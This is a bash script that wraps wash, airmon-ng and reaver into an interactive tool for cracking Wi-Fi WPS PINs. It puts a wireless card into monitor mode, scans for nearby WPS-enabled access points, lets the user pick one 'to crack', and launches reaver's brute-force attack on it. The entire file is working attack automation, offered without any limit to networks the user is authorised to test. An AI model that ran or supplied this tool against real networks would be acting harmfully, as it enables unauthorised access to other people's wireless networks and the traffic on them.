#!/bin/bash
# requires wash, airmon-ng, reaver, and a good wifi card ;)
trap finish EXIT

function finish {
airmon-ng stop $MONINT &> /dev/null
airmon-ng stop $STARTINT &> /dev/null
rm -rf /tmp/wash.tmp
printf "\nEXITING!\n"
exit 1
}

userid=$(id -u)
if [[ $userid != 0 ]];
then tput setaf 1;echo "Not root!";tput sgr0
exit 1
fi
tput setaf 2;echo "Got root.";tput sgr0
which wash &> /dev/null
if [[ $? != 0 ]];
then tput setaf 1;echo "wash not found!";tput sgr0
exit 1
fi
which airmon-ng &> /dev/null
if [[ $? != 0 ]];
then tput setaf 1;echo "airmon-ng not found!";tput sgr0
exit 1
fi
which reaver &> /dev/null
if [[ $? != 0 ]];
then tput setaf 1;echo "reaver not found!";tput sgr0
exit 1
fi
tput setaf 2;echo "Wash, Airmon-NG, and Reaver are present...";tput sgr0
echo "What interface do you want to use? (NOT IN MONITOR MODE)"
#THIS ASSUMES THAT MIGHT BE 1 MONITOR INTERFACE, AND IT THEN TRIES TO STOP IT
#IF THERE ARE TWO MONITOR INTERFACES THEN THIS WILL BREAK THINGS!
ifListWithMon="$(ls /sys/class/net | grep -E "wl|wlan" |grep -E "mon" | tr "\n" "\ " ; printf "\n")"
airmon-ng stop $ifListWithMon &> /dev/null
ifListNoMon="$(ls /sys/class/net | grep -E "wl|wlan" |grep -E "mon" -v| tr "\n" "\ " ; printf "\n")"
echo $ifListNoMon
noBlankInt() {
read STARTINT
if [[ "$STARTINT" == "" ]]
        then
                echo "Put in an interface name."
		noBlankInt
fi
}
noBlankInt
MONINT=$(ls /sys/class/net | grep -E "mon")
airmon-ng stop $MONINT &> /dev/null
airmon-ng stop $STARTINT &> /dev/null
airmon-ng start $STARTINT &> /dev/null
MONINT=$(ls /sys/class/net | grep -E "mon")
intTest() {
read num
if ! [[ "$num" =~ ^[0-9]+$ ]]
        then
                echo "Sorry! Integers only. Try again."
                intTest
fi
}

echo "how long do you want to search for Wi-Fi networks? (sec)"
intTest
touch /tmp/wash.tmp
(wash -i $MONINT -o /tmp/wash.tmp &> /dev/null & sleep $num && pkill -SIGTERM wash)&
spin='-\|/'
i=0
while kill -0 $(pidof wash) 2>/dev/null
do
  i=$(( (i+1) %4 ))
  printf "\rScanning...${spin:$i:1}"
  sleep .1
done
printf "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\n"
#yeah I know this is ugly, shut it
cat /tmp/wash.tmp |cut -c 1-18,37-43,85- |tail -n +3| sort -k2 - | sudo tee /tmp/wash.tmp &> /dev/null
printf -- "####--------MAC---------RSSI--SSID--------------------------\n"
nl -s " " -w 4 /tmp/wash.tmp
echo "which network do you want to try to crack?"
intTest
cat /tmp/wash.tmp | cut -f $num -d$'\n' | sudo tee /tmp/wash.tmp &> /dev/null
BSSID="$(cat /tmp/wash.tmp | cut -f 1 -d " ")"
reaver -i $MONINT -b $BSSID -a -vv

